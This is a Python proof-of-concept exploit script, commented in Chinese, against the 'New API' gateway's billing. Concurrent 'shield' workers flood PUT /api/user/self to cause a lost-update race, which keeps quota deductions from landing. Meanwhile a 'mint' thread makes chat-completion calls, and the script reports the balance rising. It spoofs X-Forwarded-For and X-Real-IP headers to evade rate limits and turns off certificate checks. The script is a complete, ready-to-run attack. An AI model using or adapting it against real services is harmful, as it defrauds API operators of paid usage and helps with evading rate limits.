#!/usr/bin/env python3
"""
New API 漏洞 #7 — 一键 PoC
============================
护盾 + 铸币同时运行。护盾阻止扣费，铸币产生净收益。

用法:
  python3 poc.py --base https://目标 \
    --cookie "session=xxx" --uid 21 \
    --key "sk-xxx" --model gpt-5.4-mini --rpm 2
"""

import asyncio, ssl, json, random, argparse, time, os, threading, sys
from urllib.parse import urlparse

try:
    import requests
except ImportError:
    requests = None

STOP = "/tmp/shield_stop"
shield_stats = {"200": 0, "4xx": 0, "429": 0, "err": 0}
mint_stats = {"ok": 0, "fail": 0, "total": 0}
running = True

def rip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

def build_request(method, path, host, uid, cookie, xff, body=None):
    lines = [f"{method} {path} HTTP/1.1", f"Host: {host}",
             "Content-Type: application/json", f"New-Api-User: {uid}",
             "Connection: keep-alive"]
    if body is not None:
        lines.append(f"Content-Length: {len(body)}")
    if cookie:
        ck = cookie if cookie.startswith("session=") else f"session={cookie}"
        lines.append(f"Cookie: {ck}")
    if xff:
        ip = rip()
        lines.append(f"X-Forwarded-For: {ip}")
        lines.append(f"X-Real-IP: {ip}")
    req = "\r\n".join(lines) + "\r\n\r\n"
    if body is not None:
        req = req.encode() + body
    else:
        req = req.encode()
    return req

async def read_resp(reader):
    data = b""
    while b"\r\n\r\n" not in data:
        chunk = await reader.read(4096)
        if not chunk: return None, None
        data += chunk
    head, _, rest = data.partition(b"\r\n\r\n")
    try: status = int(head.split(b" ", 2)[1])
    except: status = 0
    cl = 0; chunked = False
    for ln in head.split(b"\r\n"):
        if ln.lower().startswith(b"content-length:"):
            try: cl = int(ln.split(b":", 1)[1].strip())
            except: cl = 0
        elif ln.lower().startswith(b"transfer-encoding:") and b"chunked" in ln.lower():
            chunked = True
    body = rest
    if chunked:
        result = b""
        while True:
            while b"\r\n" not in body:
                chunk = await reader.read(4096)
                if not chunk: return status, result
                body += chunk
            size_line, _, body = body.partition(b"\r\n")
            try: size = int(size_line.strip(), 16)
            except: return status, result
            if size == 0: break
            while len(body) < size + 2:
                chunk = await reader.read(4096)
                if not chunk: break
                body += chunk
            result += body[:size]
            body = body[size + 2:]
        return status, result
    else:
        while len(body) < cl:
            chunk = await reader.read(cl - len(body))
            if not chunk: break
            body += chunk
        return status, body

async def read_quota(host, port, https, uid, cookie, ssl_ctx):
    for _ in range(8):
        try:
            reader, writer = await asyncio.open_connection(host, port, ssl=ssl_ctx if https else None)
            req = build_request("GET", "/api/user/self", host, uid, cookie, False)
            writer.write(req); await writer.drain()
            status, body = await read_resp(reader)
            try: writer.close()
            except: pass
            if status == 200 and body:
                d = json.loads(body.decode("utf-8", "replace"))
                q = d.get("data", {}).get("quota")
                if q is not None: return q
        except: pass
        await asyncio.sleep(1.0)
    return None

async def shield_worker(host, port, https, uid, cookie, xff, payload_kb, ssl_ctx, wid):
    body = json.dumps({"language": "en"}).encode() if payload_kb <= 0 \
        else json.dumps({"sidebar_modules": "A" * (payload_kb * 1024)}).encode()
    reader = writer = None
    backoff = 0.0
    while running:
        try:
            if writer is None:
                reader, writer = await asyncio.open_connection(host, port, ssl=ssl_ctx if https else None)
            writer.write(build_request("PUT", "/api/user/self", host, uid, cookie, xff, body))
            await writer.drain()
            st, _ = await read_resp(reader)
            if st is None:
                try: writer.close()
                except: pass
                writer = None; continue
            if st == 200:
                shield_stats["200"] += 1; backoff = 0.0
            elif st == 429:
                shield_stats["429"] += 1
                backoff = min(2.0, (backoff or 0.1) * 2)
                await asyncio.sleep(backoff + random.random() * 0.1)
            elif 400 <= st < 500:
                shield_stats["4xx"] += 1
            else:
                shield_stats["err"] += 1
        except:
            shield_stats["err"] += 1
            try: writer.close()
            except: pass
            writer = None; await asyncio.sleep(0.2)

def mint_worker(base, key, model, prompt, max_tokens, rpm, timeout):
    interval = 60.0 / rpm
    while running:
        url = f"{base}/v1/chat/completions"
        headers = {"Content-Type": "application/json", "Authorization": f"Bearer {key}"}
        body = {"model": model, "messages": [{"role": "user", "content": prompt}], "max_tokens": max_tokens}
        try:
            r = requests.post(url, headers=headers, json=body, timeout=timeout)
            mint_stats["total"] += 1
            if r.status_code == 200:
                mint_stats["ok"] += 1
            else:
                mint_stats["fail"] += 1
        except:
            mint_stats["total"] += 1
            mint_stats["fail"] += 1
        time.sleep(interval)

async def reporter(host, port, https, uid, cookie, ssl_ctx, t_end):
    global running
    q0 = await read_quota(host, port, https, uid, cookie, ssl_ctx)
    print(f"[poc] 起始余额={q0}", flush=True)
    while running:
        await asyncio.sleep(5)
        q = await read_quota(host, port, https, uid, cookie, ssl_ctx)
        delta = (q - q0) if (q is not None and q0 is not None) else 'NA'
        print(f"[poc] 盾={dict(shield_stats)} | 铸={dict(mint_stats)} | 余额={q} Δ={delta}", flush=True)
        if os.path.exists(STOP):
            running = False; return
        if t_end and time.time() >= t_end:
            running = False; return

async def main_async(args):
    global running
    u = urlparse(args.base)
    host = u.hostname; https = (u.scheme == "https"); port = u.port or (443 if https else 80)
    ssl_ctx = ssl._create_unverified_context() if https else None
    t_end = (time.time() + args.seconds) if args.seconds else 0
    if os.path.exists(STOP): os.remove(STOP)

    print(f"[poc] 目标={args.base} 盾={args.shield}并发 铸={args.rpm}RPM model={args.model}", flush=True)

    # Start shield tasks
    shield_tasks = [asyncio.create_task(
        shield_worker(host, port, https, args.uid, args.cookie, args.xff, args.payload_kb, ssl_ctx, i)
    ) for i in range(args.shield)]

    # Start mint thread
    if args.key and requests:
        mint_thread = threading.Thread(target=mint_worker,
            args=(args.base, args.key, args.model, args.prompt, args.max_tokens, args.rpm, args.timeout),
            daemon=True)
        mint_thread.start()
    elif not requests:
        print("[poc] 警告: 未安装 requests 库，跳过铸币。pip install requests", flush=True)

    # Start reporter
    rep = asyncio.create_task(reporter(host, port, https, args.uid, args.cookie, ssl_ctx, t_end))
    await rep

    # Cleanup
    for t in shield_tasks: t.cancel()
    running = False

    qf = await read_quota(host, port, https, args.uid, args.cookie, ssl_ctx)
    print(f"[poc] 收尾: 盾={dict(shield_stats)} 铸={dict(mint_stats)} 余额={qf}", flush=True)

def main():
    ap = argparse.ArgumentParser(description="New API Lost Update PoC")
    ap.add_argument("--base", required=True)
    ap.add_argument("--cookie", default="")
    ap.add_argument("--uid", type=int, required=True)
    ap.add_argument("--key", default="", help="铸币 API key")
    ap.add_argument("--model", default="gpt-5.4-mini")
    ap.add_argument("--rpm", type=int, default=2)
    ap.add_argument("--prompt", default="hi")
    ap.add_argument("--max-tokens", type=int, default=10)
    ap.add_argument("--timeout", type=int, default=30)
    ap.add_argument("--shield", type=int, default=15)
    ap.add_argument("--no-xff", dest="xff", action="store_false")
    ap.add_argument("--payload-kb", type=int, default=0)
    ap.add_argument("--seconds", type=int, default=0)
    args = ap.parse_args()
    if not args.cookie:
        raise SystemExit("需要 --cookie")
    try: asyncio.run(main_async(args))
    except KeyboardInterrupt: pass

if __name__ == "__main__":
    main()
